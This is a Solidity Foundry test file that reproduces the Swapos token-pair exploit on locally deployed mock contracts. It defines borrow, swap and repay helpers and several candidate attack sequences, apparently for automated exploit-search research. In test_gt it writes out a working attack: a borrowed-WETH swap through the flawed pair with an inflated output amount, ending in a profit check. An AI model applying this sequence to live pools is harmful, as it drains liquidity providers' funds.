// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {SwaposV2Pair} from "./SwaposV2Pair.sol";
import {Swapos} from "./Swapos.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WETH} from "@utils/WETH.sol";

contract SwaposV2Test is Test, BlockLoader {
    WETH weth;
    Swapos swapos;
    UniswapV2Pair pair;
    SwaposV2Pair spair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address wethAddr;
    address swaposAddr;
    address pairAddr;
    address spairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1681623155;
    uint112 reserve0pair = 145658161144708222114663;
    uint112 reserve1pair = 133386512258125308305;
    uint32 blockTimestampLastpair = 1681623155;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 25566050626255828898907897182436060;
    uint256 price1CumulativeLastpair =
        94016544460781427383945236328047841088624;
    uint256 totalSupplyweth = 3772451708783817760115995;
    uint256 balanceOfwethpair = 133386512258125308305;
    uint256 balanceOfwethattacker = 0;
    uint256 balanceOfwethspair = 133386512258125308305;
    uint256 balanceOfweth = 1085074040072792434537;
    uint256 totalSupplyswapos = 5024960847500000000000000;
    uint256 balanceOfswapospair = 145658161144708222114663;
    uint256 balanceOfswaposattacker = 0;
    uint256 balanceOfswaposspair = 145658161144708222114663;
    uint256 balanceOfswapos = 0;

    function setUp() public {
        owner = address(this);
        weth = new WETH();
        wethAddr = address(weth);
        swapos = new Swapos();
        swaposAddr = address(swapos);
        pair = new UniswapV2Pair(
            address(swapos),
            address(weth),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        spair = new SwaposV2Pair(
            address(swapos),
            address(weth),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        spairAddr = address(spair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        weth.transfer(address(pair), balanceOfwethpair);
        swapos.transfer(address(pair), balanceOfswapospair);
        weth.transfer(address(spair), balanceOfwethspair);
        swapos.transfer(address(spair), balanceOfswaposspair);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Weth Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(weth),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(swapos),
            address(weth),
            swapos.decimals()
        );
        emit log_string("");
        emit log_string("Swapos Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(swapos),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(swapos),
            address(swapos),
            swapos.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(pair),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(swapos),
            address(pair),
            swapos.decimals()
        );
        emit log_string("");
        emit log_string("Spair Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(spair),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(swapos),
            address(spair),
            swapos.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(attacker),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(swapos),
            address(attacker),
            swapos.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return weth.balanceOf(attacker) >= 1e18 + balanceOfwethattacker;
    }

    function borrow_weth_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        weth.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_weth_owner(uint256 amount) internal eurus {
        weth.transfer(owner, amount);
    }

    function borrow_swapos_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        swapos.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_swapos_owner(uint256 amount) internal eurus {
        swapos.transfer(owner, amount);
    }

    function borrow_weth_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        weth.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_weth_pair(uint256 amount) internal eurus {
        weth.transfer(address(pair), amount);
    }

    function borrow_swapos_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        swapos.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_swapos_pair(uint256 amount) internal eurus {
        swapos.transfer(address(pair), amount);
    }

    function borrow_weth_spair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(spair));
        weth.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_weth_spair(uint256 amount) internal eurus {
        weth.transfer(address(spair), amount);
    }

    function borrow_swapos_spair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(spair));
        swapos.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_swapos_spair(uint256 amount) internal eurus {
        swapos.transfer(address(spair), amount);
    }

    function swap_pair_attacker_swapos_weth(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        swapos.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_weth_swapos(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        weth.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_spair_attacker_weth_swapos(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        weth.transfer(address(spair), amount);
        spair.swap(amountOut, 0, address(attacker), "");
    }

    function swap_spair_attacker_swapos_weth(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        swapos.transfer(address(spair), amount);
        spair.swap(0, amountOut, address(attacker), "");
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_swapos(amt1, amt2);
        swap_pair_attacker_swapos_weth(amt3, amt4);
        payback_weth_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_swapos(amt1, amt2);
        swap_pair_attacker_swapos_weth(amt3, amt4);
        swap_spair_attacker_swapos_weth(amt5, amt6);
        payback_weth_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_swapos(amt1, amt2);
        swap_spair_attacker_swapos_weth(amt3, amt4);
        payback_weth_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_swapos(amt1, amt2);
        swap_spair_attacker_swapos_weth(amt3, amt4);
        swap_pair_attacker_swapos_weth(amt5, amt6);
        payback_weth_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_weth_owner(amt0);
        swap_spair_attacker_weth_swapos(amt1, amt2);
        swap_pair_attacker_swapos_weth(amt3, amt4);
        payback_weth_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_weth_owner(3e18);
        printBalance("After step0 ");
        swap_spair_attacker_weth_swapos(
            weth.balanceOf(attacker),
            pair.getAmountOut(weth.balanceOf(attacker), address(weth)) * 10
        );
        printBalance("After step1 ");
        swap_pair_attacker_swapos_weth(
            swapos.balanceOf(attacker),
            pair.getAmountOut(swapos.balanceOf(attacker), address(swapos))
        );
        printBalance("After step2 ");
        payback_weth_owner((3e18 * 1003) / 1000);
        printBalance("After step3 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_weth_owner(amt0);
        swap_spair_attacker_weth_swapos(amt1, amt2);
        swap_pair_attacker_swapos_weth(amt3, amt4);
        payback_weth_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
